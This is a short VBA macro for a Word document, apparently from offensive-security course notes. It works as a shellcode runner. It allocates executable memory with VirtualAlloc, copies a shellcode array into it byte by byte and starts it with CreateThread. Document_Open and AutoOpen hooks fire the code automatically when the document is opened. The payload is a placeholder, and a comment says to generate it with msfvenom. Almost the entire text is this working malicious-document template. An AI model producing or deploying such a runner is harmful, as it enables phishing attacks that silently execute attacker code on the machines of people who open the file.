Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
' Invoke "CreateThread" Win32API.

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
' Invoke "VirtualAlloc" Win32API.

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
' Invoke "RtlMoveMemory" Win32API.

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    ' Declare necesary variables.

    buf = Array(<SHELLCODE>)
    ' Assign to 'buf' variable an array with the contents of our <SHELLCODE>. More information on Payloads/MsfVenom/ShellCode.sh to generate our shellcode.

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    ' Alocate a memory space for store the contents of 'buf' (<SHELLCODE>) on 'addr'.

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    ' Copy the contents of 'buf' (<SHELLCODE>) on the reserved memory space on 'addr' byte-to-byte with RtlMoveMermoy.
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
    ' Execute the contents stored on 'addr' ('buf' content; <SHELLCODE>) with CreateThread.
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
' Boths methods execute MyMacro function at the open of the document.

